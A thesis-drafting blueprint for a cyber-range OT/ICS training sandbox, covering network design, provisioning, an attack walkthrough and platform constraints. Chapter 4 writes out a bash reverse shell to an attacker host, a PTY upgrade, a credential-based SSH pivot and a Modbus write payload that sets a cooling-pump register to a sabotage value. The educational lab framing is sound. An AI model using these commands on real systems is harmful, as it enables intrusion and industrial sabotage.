# BSc Thesis: 15-Page Technical Chapters Blueprint

*Structuring Chapters 3, 4, and 5 around the Simple & Complex OT Sandboxes on
CyberRangeCZ*

This document serves as an exhaustive, page-by-page drafting guide for your BSc
thesis. It expands the structural blueprints for Chapters 3, 4, and 5 into
detailed, page-aligned blueprints with specific concepts, files, data
references, and academic discussion points to help you easily reach your 15–20
page target.

---

## 📊 Chapter 3: System Design & Provisioning (6 Pages)

*Focuses on **RQ 1**: Defining virtual networks, mapping the Purdue Model, and
implementing IaC.*

---

### Page 1: Purdue Model Mapping & Network Segmentation

* **Objective:** Introduce the logical design of the OT scenarios and how they
  align with standard industrial security practices.
* **Key Concepts to Define:**
  * The **Purdue Model for Industrial Control Systems (ICS)** (its relation to
    and formalization within ISA-99 / IEC 62443 zones and conduits).
  * Subnet isolation and demarcation points.
  * Zones (Corporate, Operations, Control) and conduits (routers/firewalls).
* **Specific Data References:**
  * Simple Sandbox: Corporate/Attacker subnet `mgmt-net` (`10.10.10.0/24`) and
    Control subnet `ot-net` (`192.168.99.0/24`).
  * Complex Sandbox: Corporate (`10.10.10.0/24`), Operations
    (`192.168.100.0/24`), and Control (`192.168.20.0/24`) networks.
* **Narrative Outline:**
  1. Explain why industrial networks cannot use flat topologies (broadcast
     storms, uncontrolled access, failure propagation).
  2. Define the security levels of the Purdue Model: Level 4/5 (Enterprise IT),
     Level 3 (Operations Management / SCADA), Level 2 (Local Console / EWS),
     Level 1 (Basic Control / PLC).
  3. Discuss how you mapped these physical levels to OpenStack virtual networks
     (`Neutron`) in CyberRangeCZ.
* **Visual Aid:** A Mermaid flow diagram showing the network boundary layout of
  the Complex Sandbox.

  ```mermaid
  graph TD
      Attacker[Attacker Host - 10.10.10.50] -- Corporate Net --> Router[ot-gateway - 10.10.10.1]
    Router -- Operations Net --> HMI[SCADA HMI - 192.168.100.10]
      Router -- Control Net --> EWS[engineering-station - 192.168.20.20]
      Router -- Control Net --> PLC[openplc-node - 192.168.20.10]
  ```

---

### Page 2: Declarative Topologies (IaC) vs. Physical Testbeds

* **Objective:** Contrast physical industrial testbeds (high cost, static
  wiring, physical limits) with declarative cloud orchestration.
* **Key Concepts to Define:**
  * Infrastructure as Code (IaC) for OT.
  * Declarative topology files (`topology.yml`).
  * Virtual resources (flavors, base boxes, image registries, Neutron router
    definitions).
* **Specific Code References:**
  * [topology.yml
    (Complex)](file:///opt/cyber-range/complex-ot-sandbox/topology.yml)
* **Narrative Outline:**
  4. Discuss the historical challenges of building OT labs (wiring safety loops,
     physical footprint, lack of reset functionality).
  5. Show how `topology.yml` solves this by abstracting switches, network
     interface cards (NICs), routers, and servers into YAML.
  6. Compare the VM specs defined in the topology: `standard.small` (1 vCPU, 2GB
     RAM) for servers and `kali` (4 vCPUs, 4GB RAM) for the penetration testing
     host.
* **Code Figure:** Clean code block of the node definitions in `topology.yml`.

---

### Page 3: Gateway Firewalls and Zone Isolation (Conduits)

* **Objective:** Document the configuration of the virtual router (`ot-gateway`)
  acting as an industrial firewall.
* **Key Concepts to Define:**
  * L3 IP routing vs. L4 protocol filtering.
  * Firewall policies (Default DROP, stateful forwarding, ingress/egress
    filtering).
  * Conduits mapping (allowing specific SCADA-to-PLC and HMI-to-EWS pathways).
* **Specific Data References:**
  * [router_forward_rules.txt (Complex)][ref-router-rules]
* **Narrative Outline:**
  7. Explain why default OpenStack router rules are insufficient (they allow all
     inter-subnet forwarding).
  8. Document the custom iptables configuration injected into the gateway router
     via Ansible.
  9. Analyze the specific rules: blocking direct Corporate-to-Control access,
     blocking SCADA-to-PLC access, but permitting EWS-to-PLC on port 502 and
     SCADA-to-EWS on port 22.
* **Code Figure:** Ingress / egress forwarding rules extracted from the firewall
  dump.

---

### Page 4: SCADA HMI Service Provisioning

* **Objective:** Detail the installation, configuration, and security defaults
  of the SCADA node.
* **Key Concepts to Define:**
  * Supervisory Control and Data Acquisition (SCADA) HMIs.
  * Node-RED flow orchestration engine.
  * Systemd service bindings.
* **Specific Data References:**
  * `thesis_data_dumps_complex/hmi_nodered_status.txt`
  * `thesis_data_dumps_complex/hmi_nodered_settings.js`
* **Narrative Outline:**
  10. Discuss the choice of Node-RED as a lightweight SCADA emulator.
  11. Analyze the systemd service configurations (`nodered.service`). Explain
      the memory footprint (130.9 MB RSS) and startup CPU requirements.
  12. Document the interface binding resolution: Node-RED binds only to
      `127.0.0.1` by default. Explain the Ansible configuration task that
      modifies `settings.js` to override `uiHost` to `0.0.0.0`, allowing access
      from the attacker subnet.

---

### Page 5: PLC Service Emulation & Logic Automation

* **Objective:** Detail the installation of OpenPLC V3 and the automation of
  program compilation.
* **Key Concepts to Define:**
  * SoftPLC (Software-emulated PLC).
  * MatIEC compiler (compiling IEC 61131-3 logic like ladder diagrams to C++).
  * Headless state automation (pre-seeding runtime settings).
* **Specific Data References:**
  * [plc_openplc_status.txt (Complex)][ref-plc-status]
  * [plc_openplc_db_schema.txt (Complex)][ref-plc-schema]
* **Narrative Outline:**
  13. Explain how OpenPLC compiles ladder logic into C++ binaries
      (`./core/openplc`) which run inside a virtual environment.
  14. Discuss the virtualization of memory addresses (holding registers mapping
      to virtual hardware).
  15. Explain the SQLite database modifications. OpenPLC is built for
      interactive GUI configurations; explain how you used SQL statements on
      startup to force the runtime into Run Mode without requiring the user to
      log in to the web panel:

     ```sql
UPDATE settings SET value = 'true' WHERE key = 'Start_run_mode';
     ```

---

### Page 6: Engineering Workstation (EWS) & Telemetry Sidecar

* **Objective:** Document the EWS node deployment and its telemetry monitoring
  configuration.
* **Key Concepts to Define:**
  * Engineering Workstations (EWS) as high-privilege targets.
  * Sidecar telemetry daemons (monitoring PLC register health).
  * Python Modbus synchronization clients.
* **Specific Data References:**
  * `thesis_data_dumps_complex/ews_status.txt`
  * EWS Systemd configuration files.
* **Narrative Outline:**
  16. Explain the operational role of the EWS in the complex scenario (the pivot
      point that has firewall permission to write to the PLC).
  17. Document the Python-based safety monitor (`safety_monitor.py`) running as
      a daemon.
  18. Dissect the polling loop: the daemon runs in a loop, queries register 0
      via Modbus TCP on the PLC, and writes log notifications to
      `/var/log/safety_override.txt` if anomalies (sabotage value) are detected.

---

## 💻 Chapter 4: Attack Proof-of-Concept & Execution (5 Pages)

*Focuses on **RQ 2**: Explaining the attack lifecycle, TTY constraints,
pivoting, and packet injection.*

---

### Page 7: SCADA Entry & HMI Compromise (Florida Oldsmar Incident)

* **Objective:** Map Level 2 of the training scenario to the real-world Oldsmar
  water treatment breach.
* **Key Concepts to Define:**
  * Unauthenticated console exposure.
  * Node-RED RCE vectors (exec node execution).
  * Attacker TCP listeners.
* **Specific Data References:**
  * Level 2 solutions guide walkthrough.
* **Narrative Outline:**
  19. Discuss the Oldsmar, Florida attack vector (exposed remote access panels).
      Contrast this with Node-RED's exposed flow editor on port 1880 in the
      sandbox.
  20. Show how an attacker uses the Node-RED editor canvas to drag an `inject`
      node wired to an `exec` node to execute system shell commands as the root
      user.
  21. Document the reverse shell execution: setting up a listener (`nc -nlvp
      4444`) on Kali and sending the shell payload:

     ```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
     ```

---

### Page 8: The "Dumb" Shell Pivot Constraint (TTY Upgrade)

* **Objective:** Document the terminal limits of raw reverse shells and the
  pseudo-terminal (PTY) upgrade procedure.
* **Key Concepts to Define:**
  * Raw shells (stdin/stdout pipes) vs. Controlling TTYs.
  * Interactive CLI prompts (password masks).
  * Pseudo-terminal (PTY) spawning.
* **Specific Code References:**
  * Python `pty` library imports.
* **Narrative Outline:**
  22. Explain why standard reverse shells are "dumb" (non-interactive). They
      lack a terminal device context, meaning commands like `ssh` fail because
      they cannot capture input or mask passwords.
  23. Document the terminal hang issue that occurs when attempting to pivot
      without upgrading the terminal.
  24. Show the TTY upgrade script used to bypass this platform limitation:

     ```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
     ```

  25. Explain how this upgrade creates a virtual terminal session (`/dev/pts/X`)
      inside the shell, enabling interactive SSH password entry.

---

### Page 9: Lateral Movement and EWS SSH Pivot (Ukraine Power Grid)

* **Objective:** Map Level 3 of the scenario to the Ukraine Power Grid incident.
* **Key Concepts to Define:**
  * Credential hygiene leaks.
  * Lateral movement pivots.
  * Internal subnet scanning.
* **Specific Data References:**
  * Plaintext file `/home/debian/ews_credentials.txt` on the HMI.
  * Level 3 walkthrough command listings.
* **Narrative Outline:**
  26. Map this stage to the Ukraine 2015 attack, where engineers' EWS hosts were
      compromised using stolen credentials.
  27. Show how the attacker extracts the leaked plaintext credentials
      (`operator` / `operator123`) from the HMI filesystem.
  28. Detail the SSH pivot from the upgraded HMI shell to the EWS
      (`192.168.20.20`).
  29. Document the internal network reconnaissance commands run from the EWS:
      active ICS port sweeps (`nmap -p 502 --open 192.168.20.0/24`) and passive
      packet listening (`tcpdump -i eth0 -n port 502`).

---

### Page 10: Modbus TCP Protocol Injection & Dissection

* **Objective:** Analyze the vulnerability of unauthenticated industrial
  fieldbus protocols.
* **Key Concepts to Define:**
  * Cleartext control protocols.
  * Modbus Application Protocol (MBAP) header.
  * Register address maps.
* **Specific Data References:**
    [modbus_sabotage_complex.pcap][ref-modbus-pcap]
* **Narrative Outline:**
  30. Discuss why Modbus TCP is inherently insecure (lack of authentication,
      encryption, or integrity checks).
  31. Provide a byte-level breakdown of the injection payload:

     `\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x27\x0f`

  32. Map the payload fields to a clean academic table.
* **Data Table:**

  | Bytes | Field | Description |
  |---|---|---|
  | `00 01` | Transaction ID | Sequence matching |
  | `00 00` | Protocol ID | `0` = Modbus TCP |
  | `00 06` | Length | 6 bytes follow |
  | `01` | Unit ID | Slave device address 1 |
  | `06` | Function Code | `0x06` (Write Single Register) |
  | `00 00` | Reference Address | Holding Register 0 (Cooling Pump) |
  | `27 0F` | Value | Hex for decimal `9999` (Sabotage Value) |

---

### Page 11: Network Capture (PCAP) Audit & Logic Verification

* **Objective:** Document how the sabotage payload is analyzed and validated on
  the network.
* **Key Concepts to Define:**
  * PCAP verification.
  * Industrial write acknowledgments.
  * Non-intrusive flag verification.
* **Specific Data References:**
  * Wireshark trace log from `modbus_sabotage_complex.pcap`.
* **Narrative Outline:**
  33. Document the flow of the network capture: TCP handshake (SYN → SYN-ACK →
      ACK), Modbus Write request from EWS, Modbus response from PLC (mirroring
      the write command to acknowledge success), and connection termination.
  34. Discuss how the python monitor on the EWS detects this register
      alteration, captures the event, and writes the validation flag
      `FLAG{PUMP_DISABLED_SUCCESS}` to `/var/log/safety_override.txt`.
  35. Discuss why this validation method is highly realistic: it verifies the
      compromise via log outputs and telemetry, mimicking an actual incident
      responder auditing systems.

---

## ⚙️ Chapter 5: Technical Challenges & Sizing Constraints (5 Pages)

*Focuses on **RQ 2** and **RQ 3**: Platform limitations, sizing profiles,
scheduling limits, and future work.*

---

### Page 12: IaC and Dependency Challenges (Friction Points 1–3)

* **Objective:** Detail the package manager and compilation bottlenecks solved
  during Ansible deployment.
* **Key Concepts to Define:**
  * Python PEP 668 PEP-hardened policies.
  * Keyword-only API signatures.
  * Ansible compilation idempotency guards.
* **Narrative Outline:**
  36. **PEP 668 Constraints:** Explain the error message encountered during
      Debian 12 package installs. Detail the solution (virtual environment
      isolation) and why standard IaC files must adapt to modern Linux
      distributions.
  37. **Pymodbus 2-to-3 API drift:** Detail the positional signature change in
      `read_holding_registers`. Explain the risk of silent script failures in
      safety daemons.
  38. **OpenPLC Build Idempotency:** Explain how pre-existing database files
      (`openplc.db`) cause Ansible build guards to falsely skip compiler
      installations, and why checking execution binaries (`start_openplc.sh`)
      guarantees build integrity.

---

### Page 13: CyberRangeCZ Platform Limitations (Friction Points 4–6)

* **Objective:** Document the infrastructure limitations of the CyberRangeCZ
  platform.
* **Key Concepts to Define:**
  * Out-of-band management subnets.
  * Graph visualization dual-homing bugs.
  * Hypervisor memory allocation starvations.
* **Narrative Outline:**
  39. **Management Subnet Overlaps:** Document the collision of assigning
      sandbox subnets inside the platform's `192.168.128.0/17` DHCP range, and
      how it causes host routing tables to fail.
  40. **Visualizer Rendering Crushes:** Document the bug where dual-homed
      instances crash the portal's graphical network map, and how enforcing
      single-homed hosts with routing gateways resolved this while improving
      Purdue compliance.
  41. **Nova Scheduler Starvation:** Detail the OpenStack memory starvation
      error where instances enter the `ERROR` state with generic `%!s(<nil>)`
      codes, and how single-active-pool constraints mitigate this.

---

### Page 14: Virtualization Sizing Profiles & Resource Overhead

* **Objective:** Compile the physical performance cost of deploying the OT
  scenario sandbox.
* **Key Concepts to Define:**
  * Nested KVM virtualization overhead (VMCS/VMEXIT trapping).
  * Storage shrink optimizations (Kali bloat vs. Debian core).
  * Commited RAM allocations.
* **Specific Data References:**
  * `host_ram.txt`, `plc_ram.txt`, `hmi_ram.txt`, `ews_ram.txt` in both dumps.
* **Narrative Outline:**
  42. Document the physical host resource consumption (Ryzen 9955HX using 32GB
      RAM out of 46GB).
  43. Compare memory allocations at idle: OpenPLC runtime (111MB RSS) vs
      Node-RED (130MB RSS), showing that virtual PLCs have extremely low
      resource costs.
  44. Outline the complete sizing footprint table comparing the Simple and
      Complex sandboxes.
* **Data Table:**

  | Sandbox | VMs | total vCPUs | total RAM | Disk Baseline |
  |---|---|---|---|---|
  | **Simple** | 4 | 7 | 10.3 GB | 2.1 GB |
  | **Complex** | 5 | 8 | 12.3 GB | 1.5 GB |

---

### Page 15: OT Real-Time Scheduling Constraints & Emulation Limits

* **Objective:** Contrast soft scheduling emulators against hard real-time
  hardware.
* **Key Concepts to Define:**
  * Real-Time Operating Systems (RTOS) determinism.
  * Completely Fair Scheduler (CFS) under `SCHED_OTHER` Linux policies.
  * Control loop scan cycles and jitter.
* **Specific Data References:**
  * `plc_openplc_status.txt` CPU time metrics.
* **Narrative Outline:**
  45. Contrast the cycle timing of a physical Siemens S7-1500 PLC (1 ms cycle, <
      0.05 ms jitter) against virtual OpenPLC running as a CFS userland process
      on Debian.
  46. Analyze the CPU time consumed by OpenPLC at rest (~0.37% average load),
      showing that scheduling delays are caused by kernel context switching, not
      process exhaustion.
  47. Conclude why CFS scheduling jitter (10-100 ms under host stress) is fully
      acceptable for cybersecurity logic training (functional equivalence) but
      dangerous for physical dynamics testing.

---

### Page 16: Future Work: Software-Defined Extensions (Feasibility)

* **Academic Focus:** Outline the feasibility of purely software-defined
  extensions to improve the educational value of the range.
* **Blueprints to Present:**
  48. **Kinetic Loop Simulation:** Detail how a state machine inside the Python
      daemon can calculate simulated cooling pump temperatures, adding
      time-pressure constraints for students.
  49. **Intrusion Detection Integration:** Propose installing Snort or Zeek on
      the `ot-gateway` VM to capture network PCAPs, allowing students to write
      and verify signature-based rule alerts for industrial protocol packets.
  50. **Protocol Diversity:** Outline how OpenPLC's native listeners for Siemens
      S7comm and EtherNet/IP can be utilized to expand the range into
      multi-protocol scenario training.
  51. **Adaptive Training Pathways:** Propose branching pathways in CyberRangeCZ
      (remediation paths for struggling users, advanced challenges like DNP3
      hijacking for fast users) to transition the sandbox from a fixed sequence
      to a dynamic learning structure.

<!-- Reference links -->
[ref-router-rules]: file:///opt/cyber-range/devops-crczp-lite/thesis_data_dumps_complex/router_forward_rules.txt
[ref-plc-status]: file:///opt/cyber-range/devops-crczp-lite/thesis_data_dumps_complex/plc_openplc_status.txt
[ref-plc-schema]: file:///opt/cyber-range/devops-crczp-lite/thesis_data_dumps_complex/plc_openplc_db_schema.txt
[ref-modbus-pcap]: file:///opt/cyber-range/devops-crczp-lite/thesis_data_dumps_complex/modbus_sabotage_complex.pcap
